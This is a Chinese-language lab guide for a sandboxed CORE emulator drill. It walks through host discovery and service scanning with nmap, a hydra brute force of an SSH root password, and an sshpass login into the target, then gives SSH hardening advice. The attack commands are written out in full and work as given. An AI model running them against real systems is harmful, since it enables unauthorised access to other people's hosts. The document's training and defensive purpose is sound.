# CORE 漏洞演练:跨段 SSH 弱口令攻击

> **一句话**:用 CORE 网络仿真器搭建"攻击机 → 路由器 → 靶机"双网段拓扑,通过 CORE HTTP Bridge 的前端终端,
> 依次完成 **存活探测 → 端口扫描 → 弱口令爆破 → 凭据登录**,完整复现一次 SSH 弱口令攻击演练。
> 全程在本机 CORE 沙箱内进行,授权安全测试场景。

---

## 1. 背景

### 1.1 演练场景
- **攻击机 (attacker)**:模拟渗透测试入口,具备 nmap / hydra / sshpass / ssh 等工具。
- **靶机 (target)**:模拟边界/内网主机,对外开放 SSH(OpenSSH 8.9p1),且配置了**弱口令**(`root:123456`)。
- **路由器 (router)**:模拟真实网络的**跨网段路由**,攻击机与靶机不直接相邻,必须穿越路由。

### 1.2 网络拓扑
```
  攻击机                    路由器                     靶机
attacker                 router                   target
  10.0.0.2             10.0.0.1 / 10.0.1.1         10.0.1.2
   (eth0)                                        (eth0, SSH:22)
       │                     │                       │
       └───── 10.0.0.0/24 ───┴────── 10.0.1.0/24 ────┘
                    攻击网段                 靶机网段
```
> 说明:拓扑通过 **CORE HTTP Bridge 的 JSON 拓扑导入接口**创建,节点服务(`SSH`/`DefaultRoute`)随拓扑定义写入,
> **会话实例化后 SSH 服务自动拉起**,全程无需手动在节点内配服务。链路接口 IP 在拓扑中显式指定,保证网段可控。
> 攻击机在 `10.0.0.0/24`、靶机在 `10.0.1.0/24`,攻击机与靶机**不在同一网段**,必须穿越路由器转发。
> 拓扑可移植到任意网段(本演练在 `10.0.0/24 + 10.0.1/24` 与 `192.168.50/60` 两套网段各跑了完整一遍,均成立)。

### 1.3 环境前提
- CORE(Common Open Research Emulator)已安装,`core-daemon` 运行中。
- CORE HTTP Bridge 已部署并监听 `8080`。
- 根文件系统共享:CORE 节点是 network namespace,**复用宿主机文件系统**——
  因此宿主机安装的工具(nmap/hydra/sshpass)在**每个前端终端里直接可用**,无需逐节点安装。

---

## 2. 安装所需软件

> 演练工具在**宿主机**安装即可,节点终端自动继承。目标机除 CORE 与 Bridge 外若无任何软件,
> 请用文末的"离线安装包"把缺失工具补上。

| 工具 | 用途 | 安装命令(Ubuntu) |
|:----|:----|:----|
| nmap | 存活探测 + 端口/服务扫描 | `apt-get install -y nmap` |
| hydra | SSH 弱口令爆破 | `apt-get install -y hydra` |
| sshpass | 非交互 ssh 登录(验证爆破结果) | `apt-get install -y sshpass` |
| openssh-server | 靶机 SSH 服务(由拓扑 SSH 服务拉起) | `apt-get install -y openssh-server` |

---

## 3. 演练步骤

> 所有攻击命令在**攻击机前端终端**中执行。前端终端 = 打开 Bridge 前端 → 选中攻击机节点 → 使用交互式终端。

### Step 1 — 存活探测(主机发现)
**做什么**:确认靶机网段内哪些主机在线(攻击机与靶机跨段,需经路由器转发探测)。
```bash
nmap -sn 10.0.1.0/24
```
**预期结果**:发现路由器 `10.0.1.1` 与靶机 `10.0.1.2` 存活。
```
Nmap scan report for 10.0.1.1     Host is up
Nmap scan report for 10.0.1.2     Host is up
```

### Step 2 — 端口扫描与服务识别
**做什么**:确认靶机开放端口及对应服务版本。
```bash
nmap -sV 10.0.1.2
```
**预期结果**:确认 `22/tcp` SSH 开放,版本 OpenSSH。
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
```

### Step 3 — 弱口令爆破
**做什么**:用字典对 SSH 的 root 账户进行口令爆破,找出弱口令。
```bash
# 准备字典
cat > /tmp/_pw.txt <<PWLIST
123456
password
admin
qwerty
root
PWLIST

# 爆破
hydra -l root -P /tmp/_pw.txt ssh://10.0.1.2
```
**预期结果**:爆破出弱口令 `root:123456`。
```
[22][ssh] host: 10.0.1.2   login: root   password: 123456
```

### Step 4 — 凭据登录(权限获取)
**做什么**:用爆破得到的口令实际登录靶机,取得 shell。
```bash
# 用 UserKnownHostsFile=/dev/null 忽略已知主机 key(CORE 节点复用宿主根文件系统,
# 反复演练时 host key 变化会让 StrictHostKeyChecking=no 失效, 须一并忽略 known_hosts)
sshpass -p 123456 ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@10.0.1.2 \
  "echo LOGIN_OK; hostname; hostname -I"
```
**预期结果**:登录成功,返回靶机主机名与 IP,证明进入靶机。
```
LOGIN_OK
target
10.0.1.2
```

### (可选)Step 5 — 流量观察
**做什么**:在路由器/靶机上抓包,观察攻击流量,理解攻与防。
```bash
tcpdump -i any port 22
```

---

## 4. 总结

### 4.1 演练结论
1. **弱口令是最常见且高效的突破口** — 简单口令字典即能命中 `123456`。
2. **跨段攻击链条完整可复现** — 探测→扫描→爆破→登录四步在 CORE 沙箱内全链路成立,拓扑可移植到任意网段。
3. **CORE 服务机制省事** — SSH 服务随拓扑实例化自动拉起,无需人工配置。

### 4.2 对应的防护建议
- **禁用 root 密码登录**:`PermitRootLogin prohibit-password` + 强制密钥认证。
- **弱口令治理**:使用强口令/密码策略,部署口令复杂度校验。
- **SSH 加固**:限制源 IP(防火墙)、启用失败重试锁定(fail2ban)、更换非默认端口作为缓解。
- **日志与告警**:开启 secure 日志审计,对爆破特征(高频失败连接)做告警。

### 4.3 演练资产
- 拓扑(可重放):见文末离线包 `topology/`。
- 本演练在 `10.0.0/24 + 10.0.1/24` 与 `192.168.50/60` 两套网段各跑通完整跨段链路,命令与预期结果一致。

---

## 5. 离线安装包使用

离线环境下,目标机通常除 CORE 与 Bridge 外**没有** nmap/hydra/sshpass。将演练工具一并打包:

```bash
# 1. 解压
tar xzf core-drill-offline-...tar.gz
cd core-drill-offline

# 2. 离线安装演练工具 (不联网)
apt-get install -y ./debs/*.deb

# 3. 查看演练文档与拓扑
less docs/ssh-weak-password-drill.md
cat topology/drill-ssh-topo.json

# 4. 导入拓扑并按 install.sh 尾部提示启动会话
curl -X POST http://localhost:8080/api/topology \
  -H 'Content-Type: application/json' \
  -d @topology/drill-ssh-topo.json
# 取返回的 session_id, 启动: curl -X POST http://localhost:8080/api/sessions/<ID>/start
```